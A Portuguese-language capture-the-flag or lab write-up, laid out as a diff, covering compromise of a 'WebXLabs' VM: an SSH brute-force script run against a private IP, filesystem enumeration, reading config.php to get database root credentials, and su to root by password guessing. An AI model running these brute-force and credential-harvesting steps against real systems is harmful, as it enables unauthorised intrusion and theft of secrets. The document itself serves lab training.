@@ -1,0 +1,118 @@
+com um script que criei em bash sudo ./sshbrute.sh 192.168.1.18 wordlist webxlabs  
+
+Testando com as informações que eu ja havia obtido, tentei acesso ao ssh
+usando os nomes que ja habia anotado, vindo do banco de dados e usando o
+proprio nome da vm.
+
+apos conseguir acesso no ssh, aproveitei para explorar as pastas, gastei
+um certo tempo pois queria olhar pasta por pasta para verificar se havia
+alguma aplicação a ser explorada.
+
+OBS : a saida se estendeu apenas recortei pelo resto estar com Permission
+denied
+
+webxlabs@WebXLabs:/$ find / -name mysql
+
+/usr/bin/mysql
+
+/usr/lib/perl5/DBD/mysql
+
+/usr/lib/perl5/auto/DBD/mysql
+comecei explorando aqui 
+webxlabs@WebXLabs:/$ cd /usr/lib/perl5/auto/DBD/mysql
+
+/usr/lib/mysql
+
+/usr/share/bash-completion/completions/mysql
+
+/usr/share/php5/mysql
+
+/usr/share/mysql
+
+/etc/init.d/mysql
+
+
+
+/etc/mysql
+em seguida tentei procurar algo nesse diretorio
+webxlabs@WebXLabs:/$ cd /etc/mysql/
+webxlabs@WebXLabs:/etc/mysql$ ls
+conf.d  debian-start  debian.cnf  my.cnf
+dei cat no my.cnf e salvei algumas informações
+tais como
+[client]
+port            = 3306
+socket          = /var/run/mysqld/mysqld.sock
+[mysqld]
+#
+# * Basic Settings
+#
+user            = root
+pid-file        = /var/run/mysqld/mysqld.pid
+socket          = /var/run/mysqld/mysqld.sock
+port            = 3306
+basedir         = /usr
+datadir         = /var/lib/mysql
+tmpdir          = /tmp
+lc-messages-dir = /usr/share/mysql
+skip-external-locking
+
+
+usando os caminhos encontrados acima fui explorar
+os outros diretorios 
+
+webxlabs@WebXLabs:/etc/mysql$ cd /usr/share/mysql/
+webxlabs@WebXLabs:/usr/share/mysql$ ls
+charsets             english               japanese                      polish
+config.huge.ini      errmsg-utf8.txt       korean                        portuguese
+config.medium.ini    estonian              mysql_system_tables.sql       romanian
+config.small.ini     fill_help_tables.sql  mysql_system_tables_data.sql  russian
+czech                french                mysql_test_data_timezone.sql  serbian
+danish               german                mysqld_multi.server           slovak
+debian-start.inc.sh  greek                 ndb-config-2-node.ini         spanish
+dutch                hungarian             norwegian                     swedish
+echo_stderr          italian               norwegian-ny                  ukrainian
+
+cd /var/www/
+webxlabs@WebXLabs:/var/www$ ls
+PHP-Fusion-7.02.07.zip  forum             maintenance.php   register.php
+_config.php             ftp_upload        members.php       robots.txt
+administration          images            messages.php      search.php
+articles.php            includes          news.php          setuser.php
+config.php              index.php         news_cats.php     showphoto.php
+contact.php             infusions         photo.php         submit.php
+downloads               lab               photogallery.php  themes
+downloads.php           locale            print.php         viewpage.php
+edit_profile.php        login.php         profile.php       weblinks.php
+faq.php                 lostpassword.php  reactivate.php
+files                   maincore.php      readarticle.php
+
+
+webxlabs@WebXLabs:/$ cd /var/www/
+webxlabs@WebXLabs:/var/www$ cat config.php 
+<?php
+// database settings
+$db_host = "localhost";
+$db_user = "root";
+$db_pass = "Security!@#";
+$db_name = "php_fusion";
+$db_prefix = "fusion2rAaL_";
+define("DB_PREFIX", "fusion2rAaL_");
+define("COOKIE_PREFIX", "fusionq9m85_");
+
+User e pass do banco de dados:
+$db_user = "root";
+$db_pass = "Security!@#";
+
+tentei manualmente algumas senhas encontradas e a senha 
+WebXLabs deu acesso ao root
+
+
+webxlabs@WebXLabs:~$ su root
+Password: WebXLabs
+
+root@WebXLabs:/home/webxlabs# id
+uid=0(root) gid=0(root) groups=0(root)
+root@WebXLabs:/home/webxlabs# whoami
+root
+root@WebXLabs:/home/webxlabs# 
